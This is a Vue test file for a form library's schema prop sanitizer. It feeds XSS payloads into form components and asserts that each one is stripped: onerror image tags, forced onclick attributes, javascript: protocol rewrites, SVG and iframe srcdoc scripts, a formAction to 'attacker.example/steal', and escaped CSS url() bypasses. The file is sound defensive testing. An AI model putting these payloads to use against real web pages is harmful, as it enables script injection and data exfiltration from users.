import { describe, expect, it, vi } from 'vitest';
import { mount } from '@vue/test-utils';
import { h } from 'vue';
import { FormFactory } from './form-factory';
import { createComponentSpec, sanitizeDOMProps, type FormSchema } from '@schepta/core';

function formWithSection(componentProps: Record<string, unknown>): FormSchema {
  return {
    $id: 'security-form', type: 'object', 'x-component': 'FormContainer', properties: {
      section: { type: 'object', 'x-component': 'FormSectionContainer', 'x-ui': { order: 1 }, 'x-component-props': componentProps, properties: {} },
    },
  } as FormSchema;
}

describe('schema DOM prop sanitization', () => {
  it('does not render Vue force-prop or force-attribute payloads', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const wrapper = mount(FormFactory, {
      props: {
        schema: formWithSection({
            '.innerHTML': '<img src=x onerror=alert(1)>',
            '^onclick': 'alert(1)',
          }),
      },
    });

    expect(wrapper.find('img').exists()).toBe(false);
    expect(wrapper.find('[onclick]').exists()).toBe(false);
    expect(wrapper.html()).not.toContain('javascript:');
    warn.mockRestore();
  });

  it('keeps legitimate Vue schema props', () => {
    const wrapper = mount(FormFactory, {
      props: {
        schema: formWithSection({ title: 'Safe title', 'data-test-id': 'safe-section' }),
      },
    });

    expect(wrapper.find('[data-test-id="safe-section"]').attributes('title')).toBe('Safe title');
  });

  it('does not let protocol rewrite a link when a host component uses the exported sanitizer', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const wrapper = mount(FormFactory, {
      props: {
        schema: formWithSection({ href: 'mailto:alert(1)', protocol: 'javascript:' }),
        components: {
          FormSectionContainer: createComponentSpec({
            id: 'FormSectionContainer',
            type: 'container',
            component: () => (props: Record<string, unknown>) => h('a', sanitizeDOMProps(props, 'a')),
          }),
        },
      },
    });

    expect(wrapper.find('a').attributes('href')).toBe('mailto:alert(1)');
    expect(wrapper.html()).not.toContain('javascript:');
    warn.mockRestore();
  });

  it('sanitizes schema props when a component spec resolves to a native tag', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const nativeSection = (tagName: string) => ({
      FormSectionContainer: createComponentSpec({ id: 'FormSectionContainer', type: 'container', component: () => tagName as any }),
    });

    const link = mount(FormFactory, {
      props: {
        schema: formWithSection({ href: 'mailto:alert(1)', protocol: 'javascript:', '.innerHTML': '<img src=x onerror=alert(1)>', '^onclick': 'alert(1)', title: 'Safe title' }),
        components: nativeSection('a'),
      },
    });
    expect(link.find('a').attributes('href')).toBe('mailto:alert(1)');
    expect(link.find('a').attributes('title')).toBe('Safe title');
    expect(link.find('img').exists()).toBe(false);
    expect(link.find('[onclick]').exists()).toBe(false);
    expect(link.html()).not.toContain('javascript:');

    const frame = mount(FormFactory, {
      props: {
        schema: formWithSection({ src: 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="alert(origin)"/>', srcdoc: '<script>alert(1)</script>' }),
        components: nativeSection('iframe'),
      },
    });
    expect(frame.find('iframe').attributes('src')).toBeUndefined();
    expect(frame.find('iframe').attributes('srcdoc')).toBeUndefined();
    warn.mockRestore();
  });

  it('does not let unsanitized attrs fall through to the native root of default inputs', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    const wrapper = mount(FormFactory, {
      props: {
        schema: {
          $id: 'fallthrough-form', type: 'object', 'x-component': 'FormContainer', properties: {
            section: {
              type: 'object', 'x-component': 'FormSectionContainer', 'x-ui': { order: 1 },
              properties: {
                groups: {
                  type: 'object', 'x-component': 'FormSectionGroupContainer',
                  properties: {
                    group: {
                      type: 'object', 'x-component': 'FormSectionGroup',
                      properties: {
                        name: {
                          type: 'object', 'x-component': 'FormField', 'x-ui': { order: 1 },
                          properties: {
                            name: {
                              type: 'string', 'x-component': 'InputText',
                              'x-component-props': {
                                innerHTML: '<img src=x onerror=alert(1)>',
                                '.innerHTML': '<img src=x onerror=alert(2)>',
                                '^onclick': 'alert(1)',
                                onClick: 'alert(1)',
                                formAction: 'https://attacker.example/steal',
                                style: { backgroundImage: 'image-set("https://attacker.example/x.png" 1x)' },
                                title: 'Safe title',
                              },
                            },
                          },
                        },
                      },
                    },
                  },
                },
              },
            },
          },
        } as unknown as FormSchema,
      },
    });

    expect(wrapper.find('input').exists()).toBe(true);
    expect(wrapper.find('img').exists()).toBe(false);
    expect(wrapper.find('[onclick]').exists()).toBe(false);
    expect(wrapper.find('[formaction]').exists()).toBe(false);
    expect(wrapper.html()).not.toContain('attacker.example');
    expect(wrapper.find('[title="Safe title"]').exists()).toBe(true);
    warn.mockRestore();
  });

  it('applies the style rules to string and array styles from schema props', () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => undefined);
    // Vue turns an array style into an object before a component sees it, so
    // each declaration is checked by the same rules as a style object.
    for (const style of [
      'position:fixed;top:0',
      ['background-image:url(https://attacker.example/x.png)'],
      ['background-image:image-set("https://attacker.example/x.png" 1x)'],
      ['background-image:\\75rl(https://attacker.example/x.png)'],
      [{ backgroundImage: 'url(https://attacker.example/x.png)' }],
    ]) {
      const wrapper = mount(FormFactory, { props: { schema: formWithSection({ style }) } });
      expect(wrapper.html()).not.toContain('position: fixed');
      expect(wrapper.html()).not.toContain('attacker.example');
    }
    warn.mockRestore();
  });
});
